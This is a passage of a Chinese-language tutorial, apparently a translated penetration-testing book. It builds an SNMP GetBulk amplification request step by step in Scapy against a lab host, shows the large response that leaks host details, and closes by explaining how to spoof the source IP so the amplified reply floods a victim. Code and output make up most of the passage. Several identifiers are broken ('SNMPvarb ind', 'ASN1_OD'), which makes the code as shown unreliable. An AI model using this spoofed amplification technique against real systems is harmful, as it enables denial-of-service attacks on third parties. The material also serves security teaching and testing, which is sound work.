+sport= domain
+dport= domain  
+len= None  
+chksum= None
+</code></pre><p>&#x8981;&#x6784;&#x5EFA;&#x6211;&#x4EEC;&#x7684;&#x8BF7;&#x6C42;&#x7684; UDP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x4F7F;&#x7528;&#x4E0E;IP&#x5C42;&#x76F8;&#x540C;&#x7684;&#x6280;&#x672F;&#x3002; &#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;<code>UDP</code> &#x5BF9;&#x8C61;&#x8D4B;&#x7ED9;&#x4E86;<code>u</code>&#x53D8;&#x91CF;&#x3002; &#x5982;&#x524D;&#x6240;&#x8FF0;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#x6765;&#x786E;&#x5B9A;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x3002; &#x5728;&#x8FD9;&#x91CC;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6E90;&#x548C;&#x76EE;&#x6807;&#x7AEF;&#x53E3;&#x7684;&#x9ED8;&#x8BA4;&#x503C;&#x90FD;&#x5217;&#x4E3A;<code>domain</code>&#x3002; &#x60A8;&#x53EF;&#x80FD;&#x80FD;&#x731C;&#x5230;&#xFF0C;&#x8FD9;&#x8868;&#x793A;&#x4E0E;&#x7AEF;&#x53E3; 53 &#x76F8;&#x5173;&#x7684; DNS&#x670D; &#x52A1;&#x3002;&#x4F60;&#x53EF;&#x80FD;&#x5DF2;&#x7ECF;&#x731C;&#x5230;&#xFF0C;&#x5B83;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x4E3A; SNMP &#x76F8;&#x5173;&#x7684;&#x7AEF;&#x53E3;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; u.dport = 161 
+&gt;&gt;&gt; u.sport = 161 
+&gt;&gt;&gt; u.display() 
+###[ UDP ]###  
+    sport= snmp  
+    dport= snmp  
+    len= None  
+    chksum= None
+</code></pre><p>&#x8981;&#x5C06;&#x6E90;&#x7AEF;&#x53E3;&#x548C;&#x76EE;&#x6807;&#x7AEF;&#x53E3;&#x66F4;&#x6539;&#x4E3A; SNMP&#xFF0C;&#x5E94;&#x5C06;&#x6574;&#x6570;&#x503C; 161 &#x4F20;&#x9012;&#x7ED9;&#x5B83;; &#x6B64;&#x503C;&#x5BF9;&#x5E94;&#x4E8E;&#x4E0E;&#x670D;&#x52A1;&#x5173;&#x8054;&#x7684; UDP &#x7AEF;&#x53E3;&#x3002; &#x8FD9;&#x4E9B;&#x66F4;&#x6539;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x518D;&#x6B21;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#x6765;&#x9A8C;&#x8BC1;&#x3002; &#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x6784;&#x5EFA;&#x4E86; IP &#x548C; UDP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6784;&#x5EFA; SNMP &#x5C42;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; snmp = SNMP() 
+&gt;&gt;&gt; snmp.display() 
+###[ SNMP ]###
+  version= v2c
+  community= &apos;public&apos;
+  \PDU\
+   |###[ SNMPget ]###
+   | id= 0
+   | error= no_error
+   | error_index= 0
+   |
+  \varbindlist\
+</code></pre><p>&#x4E3A;&#x4E86;&#x6784;&#x5EFA;&#x6211;&#x4EEC;&#x7684;&#x8BF7;&#x6C42;&#x7684; SNMP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x4F7F;&#x7528;&#x4E0E; IP &#x548C; UDP &#x5C42;&#x76F8;&#x540C;&#x7684;&#x6280;&#x672F;&#x3002; &#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;<code>SNMP</code> &#x5BF9;&#x8C61;&#x5DF2;&#x8D4B;&#x7ED9;<code>snmp</code>&#x53D8;&#x91CF;&#x3002; &#x5982;&#x524D;&#x6240;&#x8FF0;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#x6765;&#x6807;&#x8BC6;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x3002; &#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x6784;&#x5EFA;&#x4E86; IP&#xFF0C;UDP &#x548C; SNMP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6784;&#x5EFA;&#x4E00;&#x4E2A;&#x6279;&#x91CF;&#x8BF7;&#x6C42;&#x6765;&#x66FF;&#x6362;&#x9ED8;&#x8BA4;&#x8D4B;&#x7ED9; <code>PDU</code> &#x503C;&#x7684;<code>SNMPget</code>&#x8BF7;&#x6C42;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; bulk = SNMPbulk() 
+&gt;&gt;&gt; bulk.display() 
+###[ SNMPbulk ]###  
+    id= 0  
+    non_repeaters= 0  
+    max_repetitions= 0  
+    \varbindlist\
+</code></pre><p>&#x4E3A;&#x4E86;&#x6784;&#x5EFA; SNMP &#x6279;&#x91CF;&#x8BF7;&#x6C42;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x4F7F;&#x7528;&#x4E0E; IP&#xFF0C;UDP &#x548C; SNMP &#x5C42;&#x76F8;&#x540C;&#x7684;&#x6280;&#x672F;&#x3002; &#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;SNMP &#x6279;&#x91CF;&#x8BF7;&#x6C42;&#x5DF2;&#x8D4B;&#x7ED9;&#x4E86;<code>bulk</code>&#x53D8;&#x91CF;&#x3002; &#x5982;&#x524D;&#x6240;&#x8FF0;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#x6765;&#x786E;&#x8BA4;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x3002; &#x5728;&#x8FD9;&#x91CC;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x51E0;&#x4E2A;&#x503C;&#x9700;&#x8981;&#x4FEE;&#x6539;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; bulk.max_repetitions = 50 
+&gt;&gt;&gt; bulk.varbindlist=[SNMPvarbind(oid=ASN1_OID(&apos;1.3.6.1.2.1.1&apos;)),SNMPvarb ind(oid=ASN1_OID(&apos;1.3.6.1.2.1.19.1.3&apos;))] 
+&gt;&gt;&gt; bulk.display() 
+###[ SNMPbulk ]###  
+    id= 0  
+    non_repeaters= 0  
+    max_repetitions= 50  
+    \varbindlist\   
+    |###[ SNMPvarbind ]###   
+    |  oid= &lt;ASN1_OID[&apos;.1.3.6.1.2.1.1&apos;]&gt;   
+    |  value= &lt;ASN1_NULL[0]&gt;   
+    |###[ SNMPvarbind ]###   
+    |  oid= &lt;ASN1_OID[&apos;.1.3.6.1.2.1.19.1.3&apos;]&gt;   
+    |  value= &lt;ASN1_NULL[0]&gt;
+</code></pre><p>SNMP <code>varbindlist</code>&#x9700;&#x8981;&#x4FEE;&#x6539;&#x6765;&#x5305;&#x542B;&#x67E5;&#x8BE2;&#x7684; OID &#x503C;&#x3002; &#x6B64;&#x5916;&#xFF0C;<code>max_repetitions</code>&#x8D4B;&#x4E86;&#x6574;&#x6570;&#x503C;&#x4E3A; 50&#x3002;&#x73B0;&#x5728;&#x6279;&#x91CF;&#x8BF7;&#x6C42;&#x5DF2;&#x914D;&#x7F6E;&#x5B8C;&#x6BD5;&#xFF0C;&#x6279;&#x91CF;&#x8BF7;&#x6C42;&#x5BF9;&#x8C61;&#x5E94;&#x8D4B;&#x7ED9;<code>SNMP PDU</code>&#x503C;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; snmp.PDU = bulk 
+&gt;&gt;&gt; snmp.display() 
+###[ SNMP ]###  
+version= v2c  
+community= &apos;public&apos;
+  \PDU\
+   |###[ SNMPbulk ]###
+   | id= 0
+   | non_repeaters= 0
+   | max_repetitions= 50
+   | \varbindlist\
+   |
+   |###[ SNMPvarbind ]###
+   |
+   | oid= &lt;ASN1_OID[&apos;.1.3.6.1.2.1.1&apos;]&gt;
+   |
+   | value= &lt;ASN1_NULL[0]&gt;
+   |
+   |###[ SNMPvarbind ]###
+   |
+   | oid= &lt;ASN1_OID[&apos;.1.3.6.1.2.1.19.1.3&apos;]&gt;
+   |
+   | value= &lt;ASN1_NULL[0]&gt;
+</code></pre><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#x6765;&#x9A8C;&#x8BC1;&#x6279;&#x91CF;&#x8BF7;&#x6C42;&#x662F;&#x5426;&#x5DF2;&#x8D4B;&#x7ED9;<code>SNMP PDU</code>&#x503C;&#x3002; &#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x6784;&#x5EFA;&#x4E86; IP&#xFF0C;UDP &#x548C; SNMP &#x5C42;&#xFF0C;&#x5E76;&#x4E14;&#x6279;&#x91CF;&#x8BF7;&#x6C42;&#x5DF2;&#x7ECF;&#x914D;&#x7F6E;&#x5E76;&#x8D4B;&#x7ED9; SNMP &#x5C42;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5806;&#x53E0;&#x8FD9;&#x4E9B;&#x5C42;&#x6765;&#x6784;&#x9020;&#x8BF7;&#x6C42;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; request = (i/u/snmp) 
+&gt;&gt;&gt; request.display() 
+###[ IP ]###
+  version= 4
+  ihl= None
+  tos= 0x0
+  len= None
+  id= 1
+  flags=
+  frag= 0
+  ttl= 64
+  proto= udp
+  chksum= None
+  src= 172.16.36.224
+  dst= 172.16.36.134
+  \options\ 
+###[ UDP ]###
+     sport= snmp   
+     dport= snmp    
+     len= None    
+     chksum= None 
+###[ SNMP ]###
+        version= v2c     
+        community= &apos;public&apos;   
+        \PDU\       
+        |###[ SNMPbulk ]###   
+        |  id= 0      
+        |  non_repeaters= 0    
+        |  max_repetitions= 50   
+        |  \varbindlist\        
+        | 
+        |###[ SNMPvarbind ]###   
+        |  
+        |  oid= &lt;ASN1_OID[&apos;.1.3.6.1.2.1.1&apos;]&gt;   
+        | 
+        |  value= &lt;ASN1_NULL[0]&gt;   
+        |  
+        |###[ SNMPvarbind ]###   
+        | 
+        |  oid= &lt;ASN1_OID[&apos;.1.3.6.1.2.1.19.1.3&apos;]&gt;  
+        |  
+        |  value= &lt;ASN1_NULL[0]&gt;
+</code></pre><p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x659C;&#x6760;&#x5206;&#x9694;&#x53D8;&#x91CF;&#x6765;&#x5806;&#x53E0; IP&#xFF0C;UDP &#x548C; SNMP &#x5C42;&#x3002; &#x7136;&#x540E;&#x53EF;&#x4EE5;&#x5C06;&#x8FD9;&#x4E9B;&#x5C42;&#x8D4B;&#x7ED9;&#x8868;&#x793A;&#x6574;&#x4E2A;&#x8BF7;&#x6C42;&#x7684;&#x65B0;&#x53D8;&#x91CF;&#x3002; &#x7136;&#x540E;&#x53EF;&#x4EE5;&#x8C03;&#x7528;<code>display()</code>&#x51FD;&#x6570;&#x6765;&#x67E5;&#x770B;&#x8BF7;&#x6C42;&#x7684;&#x914D;&#x7F6E;&#x3002; &#x4E00;&#x65E6;&#x5EFA;&#x7ACB;&#x4E86;&#x8BF7;&#x6C42;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5C06;&#x5176;&#x4F20;&#x9012;&#x7ED9;&#x53D1;&#x9001;&#x548C;&#x63A5;&#x6536;&#x51FD;&#x6570;&#xFF0C;&#x4EE5;&#x4FBF;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5206;&#x6790;&#x54CD;&#x5E94;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; ans = sr1(request,verbose=1,timeout=5) 
+Begin emission: 
+Finished to send 1 packets.
+
+Received 1 packets, got 1 answers, remaining 0 packets 
+&gt;&gt;&gt; ans.display()
+
+###[ IP ]###
+  version= 4L
+  ihl= 5L
+  tos= 0x0
+  len= 1500
+  id= 27527
+  flags= MF
+  frag= 0L
+  ttl= 128
+  proto= udp
+  chksum= 0x803
+  src= 172.16.36.134
+  dst= 172.16.36.224
+  \options\ 
+###[ UDP ]###
+   sport= snmp
+   dport= snmp
+   len= 2161
+   chksum= 0xdcbf 
+###[ Raw ]###
+     load= &apos;0\x82\x08e\x02\x01\x01\x04\x06public\xa2\x82\x08V\x02\ x01\x00\x02\x01\x00\x02\x01\x000\x82\x08I0\x81\x8b\x06\x08+\x06\x01\x02\ x01\x01\x01\x00\x04\x7fHardware: x86 Family 6 Model 58 Stepping 9 AT/AT COMPATIBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)0\x10\x06\t+\x06\x01\x02\x01\x19\x01\x01\x00C\x03p\xff?0\x18\x06\ x08+\x06\x01\x02\x01\x01\x02\x00\x06\x0c+\x06\x01\x04\x01\x827\x01\x01\ x03\x01\x010\x15\x06\t+\x06\x01\x02\x01\x19\x01\x02\x00\x04\x08\x07\xde\ x02\x19\x08\r\x1d\x030\x0f\x06\x08+\x06\x01\x02\x01\x01\x03\x00C\x03o\ x8e\x8a0\x0e\x06\t+\x06\x01\x02\x01\x19\x01\x03\x00\x02\x01\x000\x0c\ x06\x08+\x06\x01\x02\x01\x01\x04\x00\x04\x000\r\x06\t+\x06\x01\x02\x01\ x19\x01\x04\x00\x04\x000\x1b\x06\x08+\x06\x01\x02\x01\x01\x05\x00\x04\ x0fDEMO-72E8F41CA40\x0e\x06\t+\x06\x01\x02\x01\x19\x01\x05\x00B\x01\x020\ x0c\x06\x08+\x06\x01\x02\x01\x01\x06\x00\x04\x000\x0e\x06\t+\x06\x01\ x02\x01\x19\x01\x06\x00B\x01/0\r\x06\x08+\x06\x01\x02\x01\x01\x07\x00\ x02\x01L0\x0e\x06\t+\x06\x01\x02\x01\x19\x01\x07\x00\x02\x01\x000\r\x06\ x08+\x06\x01\x02\x01\x02\x01\x00\x02\x01\x020\x10\x06\t+\x06\x01\x02\x01\ x19\x02\x02\x00\x02\x03\x1f\xfd\xf00\x0f\x06\n+\x06\x01\x02\x01\x02\x02\ x01\x01\x01\x02\x01\x010\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\ x01\x01\x02\x01\x010\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x01\x02\x02\ x01\x020\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x01\x02\x02\x01\ x020(\x06\n+\x06\x01\x02\x01\x02\x02\x01\x02\x01\x04\x1aMS TCP Loopback interface\x000\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x01\x03\x02\x01\x030P\x06\n+\x06\x01\x02\x01\x02\x02\x01\x02\x02\x04BAMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport\x000\x10\x06\x0b+\x06\ x01\x02\x01\x19\x02\x03\x01\x01\x04\x02\x01\x040\x0f\x06\n+\x06\x01\x02\ x01\x02\x02\x01\x03\x01\x02\x01\x180\x10\x06\x0b+\x06\x01\x02\x01\x19\ x02\x03\x01\x01\x05\x02\x01\x050\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\ x03\x02\x02\x01\x060\x18\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x02\ x01\x06\t+\x06\x01\x02\x01\x19\x02\x01\x050\x10\x06\n+\x06\x01\x02\x01\ x02\x02\x01\x04\x01\x02\x02\x05\xf00\x18\x06\x0b+\x06\x01\x02\x01\x19\ x02\x03\x01\x02\x02\x06\t+\x06\x01\x02\x01\x19\x02\x01\x040\x10\x06\n+\ x06\x01\x02\x01\x02\x02\x01\x04\x02\x02\x02\x05\xdc0\x18\x06\x0b+\x06\ x01\x02\x01\x19\x02\x03\x01\x02\x03\x06\t+\x06\x01\x02\x01\x19\x02\x01\ x070\x12\x06\n+\x06\x01\x02\x01\x02\x02\x01\x05\x01B\x04\x00\x98\x96\ x800\x18\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x02\x04\x06\t+\x06\ x01\x02\x01\x19\x02\x01\x030\x12\x06\n+\x06\x01\x02\x01\x02\x02\x01\x05\ x02B\x04;\x9a\xca\x000\x18\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x02\ x05\x06\t+\x06\x01\x02\x01\x19\x02\x01\x020\x0e\x06\n+\x06\x01\x02\x01\ x02\x02\x01\x06\x01\x04\x000\x12\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\ x01\x03\x01\x04\x03A:\\0\x14\x06\n+\x06\x01\x02\x01\x02\x02\x01\x06\x02\ x04\x06\x00\x0c)\x18\x11\xfb01\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\ x03\x02\x04&quot;C:\\ Label:  Serial Number 5838200b0\x0f\x06\n+\x06\x01\x02\ x01\x02\x02\x01\x07\x01\x02\x01\x010\x12\x06\x0b+\x06\x01\x02\x01\x19\ x02\x03\x01\x03\x03\x04\x03D:\\0\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\ x07\x02\x02\x01\x010\x1d\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x03\ x04\x04\x0eVirtual Memory0\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x08\ x01\x02\x01\x010\x1e\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x03\x05\ x04\x0fPhysical Memory0\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x08\x02\ x02\x01\x010\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x04\x01\x02\ x01\x000\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\t\x01C\x01\x000\x11\x06\ x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x04\x02\x02\x02\x10\x000\x11\x06\ n+\x06\x01\x02\x01\x02\x02\x01\t\x02C\x03m\xbb00\x10\x06\x0b+\x06\x01\ x02\x01\x19\x02\x03\x01\x04\x03\x02\x01\x000\x12\x06\n+\x06\x01\x02\x01\ x02\x02\x01\n\x01A\x04\x05\xcb\xd6M0\x12\x06\x0b+\x06\x01\x02\x01\x19\ x02\x03\x01\x04\x04\x02\x03\x01\x00\x000\x11\x06\n+\x06\x01\x02\x01\x02\ x02\x01\n\x02A\x03\x06\xb1\xa80\x12\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\ x01\x04\x05\x02\x03\x01\x00\x000\x11\x06\n+\x06\x01\x02\x01\x02\x02\x01\ x0b\x01A\x03\rR\x920\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x05\ x01\x02\x01\x000\x10\x06\n+\x06\x01\x02\x01\x02\x02\x01\x0b\x02A\x02\x0c\ xfe0\x13\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x05\x02\x02\x04\x00\ x9f\xf6a0\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x0c\x01A\x01\x000\x10\ x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x05\x03\x02\x01\x000&apos;
+</code></pre><p>&#x54CD;&#x5E94;&#x786E;&#x8BA4;&#x4E86;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x6210;&#x529F;&#x6784;&#x5EFA;&#x4E86;&#x6240;&#x9700;&#x8BF7;&#x6C42;&#xFF0C;&#x5E76;&#x4E14;&#x4E0E;&#x6700;&#x521D;&#x751F;&#x6210;&#x7684;&#x76F8;&#x5BF9;&#x8F83;&#x5C0F;&#x8BF7;&#x6C42;&#x76F8;&#x6BD4;&#xFF0C;&#x5DF2;&#x7ECF;&#x8BF7;&#x6C42;&#x4E86;&#x76F8;&#x5F53;&#x5927;&#x7684;&#x8F7D;&#x8377;&#x3002; &#x4E0E;&#x4E4B;&#x76F8;&#x4F3C;&#xFF0C;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; Scapy &#x4E2D;&#x7684;&#x5355;&#x4E2A;&#x547D;&#x4EE4;&#x6765;&#x6267;&#x884C;&#x3002; &#x6B64;&#x547D;&#x4EE4;&#x4F7F;&#x7528;&#x6240;&#x6709;&#x4E0E;&#x4E0A;&#x4E00;&#x4E2A;&#x7EC3;&#x4E60;&#x4E2D;&#x8BA8;&#x8BBA;&#x7684;&#x76F8;&#x540C;&#x7684;&#x503C;&#xFF1A;</p>
+<pre><code>&gt;&gt;&gt; sr1(IP(dst=&quot;172.16.36.134&quot;)/UDP(sport=161,dport=161)/ SNMP(PDU=SNMPbulk(max_repetitions=50,varbindlist=[SNMPvarbind(oid=ASN1_OD(&apos;1.3.6.1.2.1.1&apos;)),SNMPvarbind(oid=ASN1_OID(&apos;1.3.6.1.2.1.19.1.3&apos;))])),ve rbose=1,timeout=5)
+
+Begin emission: Finished to send 1 packets.
+
+&lt;IP  version=4L ihl=5L tos=0x0 len=1500 id=14170 flags=MF frag=0L ttl=128 proto=udp chksum=0x3c30 src=172.16.36.134 dst=172.16.36.224 options=[] |&lt;UDP  sport=snmp dport=snmp len=2162 chksum=0xd961 |&lt;Raw  load=&apos;0\x82\ x08f\x02\x01\x01\x04\x06public\xa2\x82\x08W\x02\x01\x00\x02\x01\x00\ x02\x01\x000\x82\x08J0\x81\x8b\x06\x08+\x06\x01\x02\x01\x01\x01\x00\ x04\x7fHardware: x86 Family 6 Model 58 Stepping 9 AT/AT COMPATIBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)0\x11\ x06\t+\x06\x01\x02\x01\x19\x01\x01\x00C\x04\x00\xa3i\xad0\x18\x06\x08+\ x06\x01\x02\x01\x01\x02\x00\x06\x0c+\x06\x01\x04\x01\x827\x01\x01\x03\ x01\x010\x15\x06\t+\x06\x01\x02\x01\x19\x01\x02\x00\x04\x08\x07\xde\x02\ x19\t\x08!\x010\x0f\x06\x08+\x06\x01\x02\x01\x01\x03\x00C\x03t\x99\x180\ x0e\x06\t+\x06\x01\x02\x01\x19\x01\x03\x00\x02\x01\x000\x0c\x06\x08+\ x06\x01\x02\x01\x01\x04\x00\x04\x000\r\x06\t+\x06\x01\x02\x01\x19\x01\ x04\x00\x04\x000\x1b\x06\x08+\x06\x01\x02\x01\x01\x05\x00\x04\x0fDEMO72E8F41CA40\x0e\x06\t+\x06\x01\x02\x01\x19\x01\x05\x00B\x01\x020\x0c\x06\ x08+\x06\x01\x02\x01\x01\x06\x00\x04\x000\x0e\x06\t+\x06\x01\x02\x01\ x19\x01\x06\x00B\x01/0\r\x06\x08+\x06\x01\x02\x01\x01\x07\x00\x02\x01L0\ x0e\x06\t+\x06\x01\x02\x01\x19\x01\x07\x00\x02\x01\x000\r\x06\x08+\x06\ x01\x02\x01\x02\x01\x00\x02\x01\x020\x10\x06\t+\x06\x01\x02\x01\x19\x02\ x02\x00\x02\x03\x1f\xfd\xf00\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x01\ x01\x02\x01\x010\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x01\x01\ x02\x01\x010\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x01\x02\x02\x01\x020\ x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x01\x02\x02\x01\x020(\x06\ n+\x06\x01\x02\x01\x02\x02\x01\x02\x01\x04\x1aMS TCP Loopback interface\ x000\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x01\x03\x02\x01\x030P\ x06\n+\x06\x01\x02\x01\x02\x02\x01\x02\x02\x04BAMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport\x000\x10\x06\x0b+\x06\x01\ x02\x01\x19\x02\x03\x01\x01\x04\x02\x01\x040\x0f\x06\n+\x06\x01\x02\x01\ x02\x02\x01\x03\x01\x02\x01\x180\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\ x03\x01\x01\x05\x02\x01\x050\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x03\ x02\x02\x01\x060\x18\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x02\x01\ x06\t+\x06\x01\x02\x01\x19\x02\x01\x050\x10\x06\n+\x06\x01\x02\x01\x02\ x02\x01\x04\x01\x02\x02\x05\xf00\x18\x06\x0b+\x06\x01\x02\x01\x19\x02\ x03\x01\x02\x02\x06\t+\x06\x01\x02\x01\x19\x02\x01\x040\x10\x06\n+\x06\ x01\x02\x01\x02\x02\x01\x04\x02\x02\x02\x05\xdc0\x18\x06\x0b+\x06\x01\ x02\x01\x19\x02\x03\x01\x02\x03\x06\t+\x06\x01\x02\x01\x19\x02\x01\x070\ x12\x06\n+\x06\x01\x02\x01\x02\x02\x01\x05\x01B\x04\x00\x98\x96\x800\ x18\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x02\x04\x06\t+\x06\x01\x02\ x01\x19\x02\x01\x030\x12\x06\n+\x06\x01\x02\x01\x02\x02\x01\x05\x02B\ x04;\x9a\xca\x000\x18\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x02\x05\ x06\t+\x06\x01\x02\x01\x19\x02\x01\x020\x0e\x06\n+\x06\x01\x02\x01\x02\ x02\x01\x06\x01\x04\x000\x12\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\ x03\x01\x04\x03A:\\0\x14\x06\n+\x06\x01\x02\x01\x02\x02\x01\x06\x02\x04\ x06\x00\x0c)\x18\x11\xfb01\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x03\x02\x04&quot;C:\\ Label:  Serial Number 5838200b0\x0f\x06\n+\x06\x01\x02\x01\ x02\x02\x01\x07\x01\x02\x01\x010\x12\x06\x0b+\x06\x01\x02\x01\x19\x02\ x03\x01\x03\x03\x04\x03D:\\0\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x07\ x02\x02\x01\x010\x1d\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x03\x04\ x04\x0eVirtual Memory0\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x08\x01\ x02\x01\x010\x1e\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x03\x05\x04\ x0fPhysical Memory0\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\x08\x02\x02\ x01\x010\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x04\x01\x02\x01\ x000\x0f\x06\n+\x06\x01\x02\x01\x02\x02\x01\t\x01C\x01\x000\x11\x06\x0b+\ x06\x01\x02\x01\x19\x02\x03\x01\x04\x02\x02\x02\x10\x000\x11\x06\n+\x06\ x01\x02\x01\x02\x02\x01\t\x02C\x03m\xbb00\x10\x06\x0b+\x06\x01\x02\x01\ x19\x02\x03\x01\x04\x03\x02\x01\x000\x12\x06\n+\x06\x01\x02\x01\x02\x02\ x01\n\x01A\x04\x08OB_0\x12\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x04\ x04\x02\x03\x01\x00\x000\x11\x06\n+\x06\x01\x02\x01\x02\x02\x01\n\x02A\ x03\rIe0\x12\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x04\x05\x02\x03\ x01\x00\x000\x11\x06\n+\x06\x01\x02\x01\x02\x02\x01\x0b\x01A\x03\x13\x14\ xde0\x10\x06\x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x05\x01\x02\x01\x000\ x10\x06\n+\x06\x01\x02\x01\x02\x02\x01\x0b\x02A\x02\x1e\xc10\x13\x06\ x0b+\x06\x01\x02\x01\x19\x02\x03\x01\x05\x02\x02\x04\x00\x9f\xf6a0\x0f\ x06\n+\x06\x01\x02\x01\x02\x02\x01\x0c\x01A\x01\x000\x10\x06\x0b+\x06\ x01\x02\x01\x19\x02\x03\x01\x05\x03\x02\x01\x00&apos; |&gt;&gt;&gt;
+</code></pre><p>&#x4E3A;&#x4E86;&#x5B9E;&#x9645;&#x5C06;&#x6B64;&#x547D;&#x4EE4;&#x7528;&#x4F5C;&#x653B;&#x51FB;&#xFF0C;&#x6E90; IP &#x5730;&#x5740;&#x9700;&#x8981;&#x66F4;&#x6539;&#x4E3A;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x7684; IP &#x5730;&#x5740;&#x3002; &#x8FD9;&#x6837;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x80FD;&#x591F;&#x5C06;&#x8F7D;&#x8377;&#x91CD;&#x5B9A;&#x5411;&#x7ED9;&#x90A3;&#x4E2A;&#x53D7;&#x5BB3;&#x8005;&#x3002; &#x8FD9;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5C06; IP <code>src</code>&#x503C;&#x66F4;&#x6539;&#x4E3A;&#x76EE;&#x6807; IP &#x5730;&#x5740;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x6765;&#x5B8C;&#x6210;&#xFF1A;</p>
